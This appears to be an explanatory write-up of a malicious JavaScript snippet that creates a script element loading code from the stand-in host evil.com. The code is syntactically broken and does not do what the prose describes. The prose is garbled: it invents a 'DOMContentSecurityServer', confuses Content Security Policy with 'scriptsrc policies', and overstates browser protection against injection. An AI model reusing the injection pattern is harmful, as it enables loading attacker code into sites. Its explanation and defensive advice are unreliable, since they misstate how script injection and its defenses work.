```javascript
document.getElementById('handler').addEventListener('DOMContentLoaded', (event) => {
    var handler = document.createElement("script");
    handler.src = "http://evil.com";
    handler.onload = function() {
        if (event.target.name === "handle") {
            event.preventDefault();
            handler.textContent = "The site is hacked!";
            handler.onerror = function() {
                // ... handle errors ...
            };
        } else {
            event.preventDefault();
        }
    });
});
document.getElementById('handler').removeEventListener('DOMContentLoaded', () => {
    // Cleanup the element
});
```

This script works by attaching the handler to the body element of the document. The event listener checks if the target element is a `DOMContentLoaded` event object. If it matches, the function runs `event.preventDefault()` to stop the browser from loading the original page, then appends the malicious script tag and the `textContent` property to the HTML output, immediately returning control to the browser.

The most significant risk here is the lack of any security validation. Because the event is attached to `DOMContentLoaded`, any user who can inject a script tag into a page can trigger this redirect if the browser does not block it. This is why modern browsers like Chrome and Firefox have strict `scriptsrc` policies that prevent users from injecting arbitrary scripts into pages, making this specific hijacking technique largely ineffective on current browsers.

If you are building a security tool to detect or block this kind of behavior, you can use a DOMContentSecurityServer to monitor the `scriptsrc` attributes of loaded elements. This will catch any unauthorized script injection attempts before the browser even attempts to execute them.

